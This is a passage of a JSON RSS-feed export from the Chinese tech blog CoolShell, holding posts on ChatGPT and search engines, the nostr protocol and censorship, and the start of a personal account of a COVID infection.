src=\"https://coolshell.cn/wp-content/uploads/2013/07/image6-150x150.png\" alt=\"7个示例科普CPU Cache\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/10249.html\" class=\"wp_rp_title\">7个示例科普CPU Cache</a></li><li ><a href=\"https://coolshell.cn/articles/67.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/21.jpg\" alt=\"几个你可能从来没有用过的HTML标识\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/67.html\" class=\"wp_rp_title\">几个你可能从来没有用过的HTML标识</a></li><li ><a href=\"https://coolshell.cn/articles/2834.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2010/08/super_mario-150x150.jpg\" alt=\"史上最烂的超级玛丽\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/2834.html\" class=\"wp_rp_title\">史上最烂的超级玛丽</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/22422.html\">是微服务架构不香还是云不香？</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "category": "业界新闻",
          "link": "https://coolshell.cn/articles/22422.html",
          "creator": "陈皓",
          "pubDate": "Mon, 08 May 2023 09:52:06 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "zh",
          "folder": "rip",
          "feed": "coolshell",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "b2d74608c5b65ede3d509c342c7f7f88",
          "highlights": []
        },
        {
          "title": "我看ChatGPT: 为啥谷歌掉了千亿美金",
          "description": "<p>两个月前，我试着想用 ChatGPT 帮我写篇文章《eBPF 介绍》，结果错误百出，导致我又要从头改一遍，从那天我觉得 ChatGPT 生成的内容完全不靠谱，所...</p>\n<p class=\"read-more\"><a class=\"btn btn-default\" href=\"https://coolshell.cn/articles/22398.html\"> Read More<span class=\"screen-reader-text\">  Read More</span></a></p>\nThe post <a href=\"https://coolshell.cn/articles/22398.html\">我看ChatGPT: 为啥谷歌掉了千亿美金</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "content": "<p><script async src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158\"\n     crossorigin=\"anonymous\"></script><img decoding=\"async\" loading=\"lazy\" class=\"alignright size-medium wp-image-22405\" src=\"https://coolshell.cn/wp-content/uploads/2023/02/chatgpt-300x200.jpg\" alt=\"\" width=\"300\" height=\"200\" srcset=\"https://coolshell.cn/wp-content/uploads/2023/02/chatgpt-300x200.jpg 300w, https://coolshell.cn/wp-content/uploads/2023/02/chatgpt-768x511.jpg 768w, https://coolshell.cn/wp-content/uploads/2023/02/chatgpt-406x270.jpg 406w, https://coolshell.cn/wp-content/uploads/2023/02/chatgpt.jpg 900w\" sizes=\"(max-width: 300px) 100vw, 300px\" />两个月前，我试着想用 ChatGPT 帮我写篇文章《<a title=\"eBPF 介绍\" href=\"https://coolshell.cn/articles/22320.html\">eBPF 介绍</a>》，结果错误百出，导致我又要从头改一遍，从那天我觉得 ChatGPT 生成的内容完全不靠谱，所以，从那天开始我说我不会再用 ChatGPT 来写文章（这篇文章不是由 ChatGPT 生成），因为，在试过一段时间后，我对 ChatGTP 有基于如下的认识：</p>\n<ol>\n<li><strong>ChatGPT 不是基于事实，是基于语言模型的</strong>，事实对他来说不重要，对他重要的是他能读懂你的问题，并按照一定的套路回答你的问题。</li>\n<li><strong>因为是基于套路的回答，所以，他并不能保证内容是对的，他的目标是找到漂亮的精彩的套路</strong>，于是，你会发现，他的内容组织能力和表述还不错，但是只要你认真玩上一段时间，你会发现，ChatGPT 那些表述的套路其实也比较平常一般。它的很多回答其实都不深，只能在表面上。就像 Github 的 Copilot 一样，写不了什么高级的代码，只能帮你写一些常规格式化的代码（当然，这也够了）</li>\n</ol>\n<figure id=\"attachment_22417\" aria-describedby=\"caption-attachment-22417\" style=\"width: 640px\" class=\"wp-caption aligncenter\"><img decoding=\"async\" loading=\"lazy\" class=\"wp-image-22417 size-large\" src=\"https://coolshell.cn/wp-content/uploads/2023/02/chatgpt.example-1024x853.jpg\" alt=\"\" width=\"640\" height=\"533\" srcset=\"https://coolshell.cn/wp-content/uploads/2023/02/chatgpt.example-1024x853.jpg 1024w, https://coolshell.cn/wp-content/uploads/2023/02/chatgpt.example-300x250.jpg 300w, https://coolshell.cn/wp-content/uploads/2023/02/chatgpt.example-768x640.jpg 768w, https://coolshell.cn/wp-content/uploads/2023/02/chatgpt.example-324x270.jpg 324w, https://coolshell.cn/wp-content/uploads/2023/02/chatgpt.example.jpg 1220w\" sizes=\"(max-width: 640px) 100vw, 640px\" /><figcaption id=\"caption-attachment-22417\" class=\"wp-caption-text\">ChatGPT 就是一个语言模型，如果不给他足够的数据和信息，它基本就是在胡编乱造</figcaption></figure>\n<p>所以，基于上面这两个点认识，以发展的眼光来看问题，我觉得 ChatGPT 这类的 AI 可以成为一个小助理，他的确可以干掉那些初级的脑力工作者，但是，还干不掉专业的人士，这个我估计未来也很难，不过，这也很帅了，因为大量普通的工作的确也很让人费时间和精力，<strong>但是有个前提条件——就是ChatGPT所产生的内容必需是真实可靠的，没有这个前提条件的话，那就什么用也没有了</strong>。</p>\n<p>今天，我想从另外一个角度来谈谈 ChatGPT，尤其是我在Youtube上看完了微软的发布会《<a href=\"https://youtu.be/rOeRWRJ16yY\" target=\"_blank\" rel=\"noopener\">Introducing your copilot for the web: AI-powered Bing and Microsoft Edge</a> 》，才真正意识到Google 的市值为什么会掉了1000亿美元，是的，<strong>谷歌的搜索引擎的霸主位置受到了前所未有的挑战</strong>……</p>\n<p><span id=\"more-22398\"></span></p>\n<p>我们先来分析一下搜索引擎解决了什么样的用户问题，在我看来搜索引擎解决了如下的问题：</p>\n<ul>\n<li><strong>知识或信息索引</strong>。查新闻，查股票，查历史，查文档，找答案……</li>\n<li><strong>找服务提供商</strong>。找卖东西的电商，找帮你修东西的服务，找软件……</li>\n<li><strong>信息的准确和可靠</strong>。搜索引擎的rank算法保证了最准确、最有用、最权威的信息出现在最前面……（作恶的百度不在此列）</li>\n</ul>\n<p>基本上就是上面这几个，搜索引擎在上面这几件事上作的很好，但是，还是有一些东西搜索引擎做的并不好，如：</p>\n<ul>\n<li><strong>搜索引擎是基于关键词的，不是基于语义的</strong>。所以，搜索引擎并不知道你的真实需求，因此，你会不可避免地要干下面的事，\n<ul>\n<li>你经常要不断地增加或调整不同的关键词来提高查询信息的准确度……</li>\n<li>你经常要在你查找的信息中进行二次或多次过滤和筛选……</li>\n</ul>\n</li>\n<li><strong>搜索引擎是只能呈现内容，无法解读内容</strong>。所以，你找到相关的链接后，你还要花大量的时间来阅读理解，经常性的你不可避免的要干下面的事：\n<ul>\n<li>打开一个链接，读到了一大半后，发现你要的内容不在其中，只能关掉再打开一个……</li>\n<li>你想要的内容是在的，但是太晦涩，看不懂，太费解，你要找小白友好的版本……</li>\n<li>你想要的内容不完整，你需要在很多个链接和网页上做拼图游戏……</li>\n<li>内容是无法结构化的展示的，你搜到的东西全都是碎片信息</li>\n</ul>\n</li>\n<li><strong>搜索引擎没有上下文关联，两次搜索是没有关系的</strong>。也就是说，人知道的越多，问题也就越多，所以，我们经常会面临下面的问题：\n<ul>\n<li>随着我了解的越多，我的信息搜索的会出现分支，这个分支只有我自己的管理，搜索引擎是不关心的，导致我每次都相当于从头开始……</li>\n<li>你做计划的时候，你需要从多个不同的搜索中获取你想要的东西，最终组合成你定制化的东西，比如做旅游计划……</li>\n</ul>\n</li>\n</ul>\n<p>好了，我们知道，<strong>ChatGPT 这类的技术主要是用来根据用户的需求来按一定的套路来“生成内容”的</strong>，只是其中的内容并不怎么可靠，那么，如果把搜索引擎里靠谱的内容交给 ChatGPT 呢？那么，这会是一个多么强大的搜索引擎啊，完全就是下一代的搜索引擎，上面的那些问题完全都可以解决了：</p>\n<ul>\n<li>你可以打一段话给搜索引擎，ChatGPT 是读得懂语义的。</li>\n<li>因为知道语义，于是在众多搜过结果中，他更知道哪些是你想要的内容。</li>\n<li>ChatGPT 可以帮你生成 <a href=\"https://en.wikipedia.org/wiki/TL;DR\" target=\"_blank\" rel=\"noopener\">TL;DR</a>，把长文中的要求总结出来形成更易读的短文</li>\n<li>ChatGPT 可以帮你整理内容，在多个网页中帮你整合和结构化内容</li>\n<li>ChatGPT 可以有上下文对话，你可以让他帮你不断通过更多的关键词搜索信息，并在同一个主题下生成、组织和优化内容</li>\n</ul>\n<p><strong>一旦 ChatGPT 利用上了搜索引擎内容准确和靠谱的优势，那么，ChatGPT 的能力就完全被释放出来了，所以，带 ChatGPT 的搜索引擎，就是真正的“如虎添翼”！</strong></p>\n<p>因此，微软的 Bing + ChatGPT，成为了 Google 有史以来最大的挑战者，我感觉——所有跟信息或是文字处理相关的软件应用和服务，都会因为 ChatGPT 而且全部重新洗一次牌的，这应该会是新一轮的技术革命……<strong>Copilot 一定会成为下一代软件和应用的标配！</strong></p>\n<p>（全文完）<!--\n\n\n\n<p align=\"center\"><a href= target=_blank><img decoding=\"async\" src=\"\"></a></p>\n\n\n\n\n\n<p align=\"center\"><img decoding=\"async\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img decoding=\"async\" loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br />关注CoolShell微信公众账号和微信小程序</p>\n\n \n\n--></p>\n<div style=\"margin-top: 15px; font-size: 16px;color: #cc0000;\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n\n<div class=\"wp_rp_wrap  wp_rp_vertical_m\" ><div class=\"wp_rp_content\"><h3 class=\"related_post_title\">相关文章</h3><ul class=\"related_post wp_rp\"><li ><a href=\"https://coolshell.cn/articles/12136.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2014/11/inbox2-640x264-150x150.jpg\" alt=\"Google Inbox如何跨平台重用代码？\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/12136.html\" class=\"wp_rp_title\">Google Inbox如何跨平台重用代码？</a></li><li ><a href=\"https://coolshell.cn/articles/9508.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2013/04/Google-Person-Finder-150x150.png\" alt=\"PFIF网上寻人协议\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/9508.html\" class=\"wp_rp_title\">PFIF网上寻人协议</a></li><li ><a href=\"https://coolshell.cn/articles/5815.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/2.jpg\" alt=\"来信， 创业 和 移动互联网\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/5815.html\" class=\"wp_rp_title\">来信， 创业 和 移动互联网</a></li><li ><a href=\"https://coolshell.cn/articles/5701.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/24.jpg\" alt=\"SteveY对Amazon和Google平台的吐槽\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/5701.html\" class=\"wp_rp_title\">SteveY对Amazon和Google平台的吐槽</a></li><li ><a href=\"https://coolshell.cn/articles/5224.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2011/09/image008-150x150.jpg\" alt=\"一些文章和各种资源\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/5224.html\" class=\"wp_rp_title\">一些文章和各种资源</a></li><li ><a href=\"https://coolshell.cn/articles/3806.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2011/02/C_String-150x150.jpg\" alt=\"Google图片搜索下的的C String\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/3806.html\" class=\"wp_rp_title\">Google图片搜索下的的C String</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/22398.html\">我看ChatGPT: 为啥谷歌掉了千亿美金</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "category": "业界新闻",
          "link": "https://coolshell.cn/articles/22398.html",
          "creator": "陈皓",
          "pubDate": "Sat, 11 Feb 2023 16:31:16 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "zh",
          "folder": "rip",
          "feed": "coolshell",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "78df480c8056e5dc36d6ad49ce826da1",
          "highlights": []
        },
        {
          "title": "聊聊 nostr 和 审查",
          "description": "<p>这两天在网络上又有一个东西火了，Twitter 的创始人 @jack 新的社交 iOS App  Damus 上苹果商店（第二天就因为违反中国法律在中国区下架了...</p>\n<p class=\"read-more\"><a class=\"btn btn-default\" href=\"https://coolshell.cn/articles/22367.html\"> Read More<span class=\"screen-reader-text\">  Read More</span></a></p>\nThe post <a href=\"https://coolshell.cn/articles/22367.html\">聊聊 nostr 和 审查</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "content": "<p><script async src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158\"\n     crossorigin=\"anonymous\"></script><img decoding=\"async\" loading=\"lazy\" class=\"alignright size-medium wp-image-22368\" src=\"https://coolshell.cn/wp-content/uploads/2023/02/nostr-aplicacion-descentralizada-1140x570-1-300x150.png\" alt=\"\" width=\"300\" height=\"150\" srcset=\"https://coolshell.cn/wp-content/uploads/2023/02/nostr-aplicacion-descentralizada-1140x570-1-300x150.png 300w, https://coolshell.cn/wp-content/uploads/2023/02/nostr-aplicacion-descentralizada-1140x570-1-1024x512.png 1024w, https://coolshell.cn/wp-content/uploads/2023/02/nostr-aplicacion-descentralizada-1140x570-1-768x384.png 768w, https://coolshell.cn/wp-content/uploads/2023/02/nostr-aplicacion-descentralizada-1140x570-1-540x270.png 540w, https://coolshell.cn/wp-content/uploads/2023/02/nostr-aplicacion-descentralizada-1140x570-1.png 1140w\" sizes=\"(max-width: 300px) 100vw, 300px\" />这两天在网络上又有一个东西火了，Twitter 的创始人 <a href=\"https://twitter.com/jack\">@jack</a> 新的社交 iOS App  <a href=\"https://apps.apple.com/ca/app/damus/id1628663131\" target=\"_blank\" rel=\"noopener\">Damus</a> 上苹果商店（第二天就因为违反中国法律在中国区下架了），这个软件是一个去中心化的 Twitter，使用到的是 nostr &#8211; Notes and Other Stuff Transmitted by Relays 的协议（<a href=\"https://github.com/nostr-protocol/nostr\" target=\"_blank\" rel=\"noopener\">协议简介</a>，<a href=\"https://github.com/nostr-protocol/nips\" target=\"_blank\" rel=\"noopener\">协议细节</a>），协议简介中有很大的篇幅是在批评Twitter和其相类似的中心化的产品，如：<a href=\"https://mastodon.social/\" target=\"_blank\" rel=\"noopener\">Mastodon</a> 和 <a href=\"https://scuttlebutt.nz/\" target=\"_blank\" rel=\"noopener\">Secure Scuttlebutt</a> 。我顺着去看了一下这个协议，发现这个协议真是非常的简单，简单到几句话就可以讲清楚了。</p>\n<h4>通讯过程</h4>\n<ul>\n<li>这个协议中有两个东西，一个是 client，一个是 relay，client 就是用户社交的客户端，relay 就是转发服务器。</li>\n<li>用户不需要注册，用户只需要有一个密钥对（公钥+私钥）就好了，然后把要发的信息做签名，发给一组 relays</li>\n<li>然后你的 Follower 就可以从这些 relays 上订阅到你的信息。</li>\n</ul>\n<p><span id=\"more-22367\"></span></p>\n<h4>技术细节摘要</h4>\n<ul>\n<li>技术实现上，nostr 使用 websocket + JSON 的方式。其中主要是下面这么几个指令\n<ul>\n<li>Client 到 Relay主要是下面这几个指令：\n<ul>\n<li><code>EVENT</code>。发出事件，可以扩展出很多很多的动作来，比如：发信息，删信息，迁移信息，建 Channel ……扩展性很好。</li>\n<li><code>REQ</code>。用于请求事件和订阅更新。收到<code>REQ</code>消息后，relay 会查询其内部数据库并返回与过滤器匹配的事件，然后存储该过滤器，并将其接收的所有未来事件再次发送到同一websocket，直到websocket关闭。</li>\n<li><code>CLOSE</code>。用于停止被 <code>REQ</code> 请求的订阅。</li>\n</ul>\n</li>\n<li>Relay 到 Client 主要是下面几个指令：\n<ul>\n<li><code>EVENT</code>。用于发送客户端请求的事件。</li>\n<li><code>NOTICE</code>。用于向客户端发送人类可读的错误消息或其他信息</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>关于 <code>EVENT</code> 下面是几个常用的基本事件：\n<ul>\n<li><code>0</code>: <code>set_metadata</code>：比如，用户名，用户头像，用户简介等这样的信息。</li>\n<li><code>1</code>: <code>text_note</code>：用户要发的信息内容</li>\n<li><code>2</code>： <code>recommend_server</code>：用户想要推荐给关注者的Relay的URL（例如<code>wss://somerelay.com</code>）</li>\n</ul>\n</li>\n</ul>\n<h4>如何对抗网络审查</h4>\n<p>那么，这个协议是如何对抗网络审查的？</p>\n<ul>\n<li>识别你的身份是通过你的签名，所以，只要你的私钥还在，你是不会被删号的</li>\n<li>任何人都可以运行一个或多个relay，所以，就很难有人控制所有的relay</li>\n<li>你还可以很方便的告诉其中的 relay 把你发的信息迁到另一个 relay 上</li>\n<li>你的信息是一次发给多个relay的，所以，只要不是所有的热门realy封了你，你就可以发出信息</li>\n<li>每个relay的运营者都可以自己制定规则，会审查哪些类型内容。用户据此选择即可。基本不会有一个全局的规则。</li>\n<li>如果你被全部的relay封了，你还是可以自建你的relay，然后，你可以通过各种方式告诉你身边的人你的relay服务器是什么？这样，他们把这个relay服务器加到他们的client列表中，你又可以从社死中复活了。</li>\n</ul>\n<p>嗯，听起来很简单，整个网络是构建在一种 “社区式”的松散结构，完全可能会出现若干个 relay zone。这种架构就像是互联网的架构，没有中心化，比如 DNS服务器和Email服务器一样，只要你愿意，你完全可以发展出自己圈子里的“私服”。</p>\n<p>其实，电子邮件是很难被封禁和审查的。我记得2003年中国非典的时候，我当时在北京，当时的卫生部部长说已经控制住了，才12个人感染，当局也在控制舆论和删除互联网上所有的真实信息。但是，大家都在用电子邮件传播信息，当时基本没有什么社交软件，大家分享信息都是通过邮件，尤其是外企工作的圈子，当时每天都要收很多的非典的群发邮件，大家还都是用公司的邮件服务器发……这种松散的，点对点的架构，让审查是基本不可能的。其实，<strong>我觉得 nostr 就是另外一个变种或是升级版的 email 的形式</strong>。</p>\n<h4>如何对抗Spam和骗子</h4>\n<p>但是问题来了，如果不能删号封人的话，那么如何对抗那些制造Spam，骗子或是反人类的信息呢？nostr目前的解决方案是通过比特币闪电网络。比如有些客户端实现了如果对方没有follow 你，如果给他发私信，需要支付一点点btc ，或是relay要求你给btc才给你发信息（注：我不认为这是一个好的方法，因为：1）因为少数的坏人让大多数正常人也要跟着付出成本，这是个糟糕的治理方式，2）不鼓励那些生产内容的人，那么平台就没有任何价值了）。</p>\n<p>不过，我觉得也有可以有下面的这些思路：</p>\n<ul>\n<li>用户主动拉黑，但很明显这个效率不高，而且体验不好</li>\n<li>社区或是同盟维护一个黑名单，relay定期更新（如同email中防垃圾邮件也是这样搞的），这其实也是审查。</li>\n<li>防Spam的算法过滤垃圾信息（如同email中干的），自动化审查。</li>\n<li>增加发Spam的成本，如: PoW 工作量证明（比特币的挖矿，最早也是用于Email），发信息要花钱（这个对正常用户伤害太大了）等。</li>\n<li>……</li>\n</ul>\n<p>总之，还是有相应的方法的，但是一定没有完美解，email对抗了这么多年，你还是可以收到大量的垃圾邮件和钓鱼邮件，所以，我觉得 nostr 也不可能做到……</p>\n<h4>怎么理解审查</h4>\n<p>最后，我们要明白的是，<strong>无论你用什么方法，审查是肯定需要的，所以，我觉得要完全干掉审查，最终的结果就是一个到处都垃圾内容的地方！</strong></p>\n<p><strong>我理解的审查不应该是为权力或是个体服务的，而是为大众和人民服务的，所以，审查必然是要有一个开放和共同决策的流程，而不是独断的</strong>。</p>\n<p>这点可以参考开源软件基金会的运作模式。</p>\n<ul>\n<li>最底端的是用户（User）参与开源社区的使用并提供问题和反馈。</li>\n<li>用户在使用过程中了解项目情况后贡献代码和文档就可以晋升为贡献者（Contributors），</li>\n<li>当贡献者提交一定数量贡献之后就可以晋升为提交者（Committers），此时你将拥有你参与仓库的代码读写权限。</li>\n<li>当提交者Committers在社区得到认可后，由项目管理委员会（PMC）选举并产生PMC成员（类似于议员），PMC成员拥有社区相关事务的投票、提名和共同决策权利和义务。</li>\n</ul>\n<p>注意下面几点</p>\n<ul>\n<li>整个社区的决策者，是要通过自己贡献来挣到被选举权的。</li>\n<li>社区所有的工作和决定都是要公开的。</li>\n<li>社区的方向和决策都是要投票的，PMC成员有binding的票权，大众也有non-binding的投票权供参考。</li>\n<li><strong>如果出现了价值观的不同，那么，直接分裂社区就好了，不同价值观的人加入到不同的社区就好了</strong>。</li>\n</ul>\n<p>如果审查是在这个框架下运作的话，虽然不完美，但至少会在一种公允的基础下运作，是透明公开的，也是集体决策的。</p>\n<p>开源软件社区是一个很成功的示范，所以，我觉得只有技术而没有一个良性的可持续运作的社区，是不可能解决问题的，<strong>干净整齐的环境是一定要有人打扫和整理的</strong>。</p>\n<p>&nbsp;</p>\n<figure id=\"attachment_22371\" aria-describedby=\"caption-attachment-22371\" style=\"width: 300px\" class=\"wp-caption aligncenter\"><img decoding=\"async\" loading=\"lazy\" class=\"wp-image-22371 size-medium\" src=\"https://coolshell.cn/wp-content/uploads/2023/02/IMG_2533-300x289.jpg\" alt=\"欢迎关注我 npub1w6r99545cxea6z76e8nvzjxnymjt4nrsddld33almtm78z7fz95s3c94nu\" width=\"300\" height=\"289\" srcset=\"https://coolshell.cn/wp-content/uploads/2023/02/IMG_2533-300x289.jpg 300w, https://coolshell.cn/wp-content/uploads/2023/02/IMG_2533-1024x987.jpg 1024w, https://coolshell.cn/wp-content/uploads/2023/02/IMG_2533-768x740.jpg 768w, https://coolshell.cn/wp-content/uploads/2023/02/IMG_2533-280x270.jpg 280w, https://coolshell.cn/wp-content/uploads/2023/02/IMG_2533.jpg 1242w\" sizes=\"(max-width: 300px) 100vw, 300px\" /><figcaption id=\"caption-attachment-22371\" class=\"wp-caption-text\">欢迎关注我 npub1w6r99545cxea6z76e8nvzjxnymjt4nrsddld33almtm78z7fz95s3c94nu</figcaption></figure>\n<p>（全文完）<!--\n\n\n\n<p align=\"center\"><a href= target=_blank><img decoding=\"async\" src=\"\"></a></p>\n\n\n\n\n\n<p align=\"center\"><img decoding=\"async\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img decoding=\"async\" loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br />关注CoolShell微信公众账号和微信小程序</p>\n\n \n\n--></p>\n<div style=\"margin-top: 15px; font-size: 16px;color: #cc0000;\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n\n<div class=\"wp_rp_wrap  wp_rp_vertical_m\" ><div class=\"wp_rp_content\"><h3 class=\"related_post_title\">相关文章</h3><ul class=\"related_post wp_rp\"><li ><a href=\"https://coolshell.cn/articles/18654.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2018/12/docker-networking-1-150x150.png\" alt=\"记一次Kubernetes/Docker网络排障\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/18654.html\" class=\"wp_rp_title\">记一次Kubernetes/Docker网络排障</a></li><li ><a href=\"https://coolshell.cn/articles/9859.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2013/06/Alan-Cox-150x150.jpg\" alt=\"Alan Cox：单向链表中prev指针的妙用\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/9859.html\" class=\"wp_rp_title\">Alan Cox：单向链表中prev指针的妙用</a></li><li ><a href=\"https://coolshell.cn/articles/5247.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/15.jpg\" alt=\"国内微博和Twitter的最大不同\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/5247.html\" class=\"wp_rp_title\">国内微博和Twitter的最大不同</a></li><li ><a href=\"https://coolshell.cn/articles/25.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/5.jpg\" alt=\"如何上网觅无踪\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/25.html\" class=\"wp_rp_title\">如何上网觅无踪</a></li><li ><a href=\"https://coolshell.cn/articles/12199.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/22.jpg\" alt=\"C++ STL string的Copy-On-Write技术\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/12199.html\" class=\"wp_rp_title\">C++ STL string的Copy-On-Write技术</a></li><li ><a href=\"https://coolshell.cn/articles/9886.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/8.jpg\" alt=\"二叉树迭代器算法\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/9886.html\" class=\"wp_rp_title\">二叉树迭代器算法</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/22367.html\">聊聊 nostr 和 审查</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "category": "业界新闻",
          "link": "https://coolshell.cn/articles/22367.html",
          "creator": "陈皓",
          "pubDate": "Fri, 03 Feb 2023 07:46:13 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "zh",
          "folder": "rip",
          "feed": "coolshell",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "5d8a7465ec6a757e32f600cf6867f799",
          "highlights": []
        },
        {
          "title": "感染新冠的经历",
          "description": "<p>写一篇与技术无关的文章，供大家参考。我住北京朝阳，从上周三开始我家一家三口陆续发烧生病，自测抗原后，都是阳性。好消息是，这个奥密克戎跟一般的病毒性感冒差不多，没...</p>\n<p class=\"read-more\"><a class=\"btn btn-default\" href=\"https://coolshell.cn/articles/22341.html\"> Read More<span class=\"screen-reader-text\">  Read More</span></a></p>\nThe post <a href=\"https://coolshell.cn/articles/22341.html\">感染新冠的经历</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "content": "<p><script async src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158\"\n     crossorigin=\"anonymous\"></script><img decoding=\"async\" loading=\"lazy\" class=\"alignright size-medium wp-image-22346\" src=\"https://coolshell.cn/wp-content/uploads/2022/12/covid19-300x225.jpg\" alt=\"\" width=\"300\" height=\"225\" srcset=\"https://coolshell.cn/wp-content/uploads/2022/12/covid19-300x225.jpg 300w, https://coolshell.cn/wp-content/uploads/2022/12/covid19-768x576.jpg 768w, https://coolshell.cn/wp-content/uploads/2022/12/covid19-360x270.jpg 360w, https://coolshell.cn/wp-content/uploads/2022/12/covid19.jpg 800w\" sizes=\"(max-width: 300px) 100vw, 300px\" />写一篇与技术无关的文章，供大家参考。我住北京朝阳，从上周三开始我家一家三口陆续发烧生病，自测抗原后，都是阳性。好消息是，这个奥密克戎跟一般的病毒性感冒差不多，没什么可怕的，不过，整个过程除了发病之外还有一些别的因为感染带出来的事，大家也需要知晓，以准备好，以免造成生活的不便，更好的照顾好自己和家人。</p>\n<h4>整个过程</h4>\n<p>我先说一下整个过程（我会不断更新这个过程，直到转阴）。说明一下，<strong>我孩子老婆都打过三针国产疫苗，孩子是科兴，老婆是北京生物，我完全没有打</strong>。</p>\n<p>先是我家孩子（12 岁）。上周三（12 月 7 日），孩子早上起来就说头疼，一测体温，38 度 5，就停止上网课，老实休息了，我们并没给孩子吃什么药，到了晚上，孩子的体温到了 39.4，嗓子疼，我老婆用酒精给孩子物理降温（注：事实上最好别用酒精，因为会被皮肤吸收导致副作用），成功降到了 38.2 左右。周四（12 月 8 日），孩子的体温在 38.2 一天，我老婆给孩子吃了莲花清瘟，被我制止了，本来想上退烧药的，但是我想体温也不算高，能不吃就不吃，于是就让孩子冲了个复方感冒冲剂（其实里面含对乙酰氨基酚，后面会说）。周五（12 月 9 日），孩子不停地出汗，到下午体温正常了，然后咳嗽，鼻涕就来了，感冒症状来了，但精神不好，体虚无力。周末休息两天就基本没事了，也转阴了。</p>\n<p>接下来就到我了。</p>\n<p><span id=\"more-22341\"></span></p>\n<p>周五那天感觉嗓子有点异样，我没怎么在意，周六（12 月 10）就开始发烧了，傍晚 18 点左右，我是手脚冰冷，还有点打冷颤，头晕，嗓子干燥，我就钻被子里了，在半睡不睡的状态下到了 20 点左右，我浑身发烫，我老婆过来给我一量体温，39.8，说要不要也抹点酒精？我想，北京这个季节，物理降温不就上阳台上站一会就好了吗？当然，我就是把窗开了个口，把室温降到 20 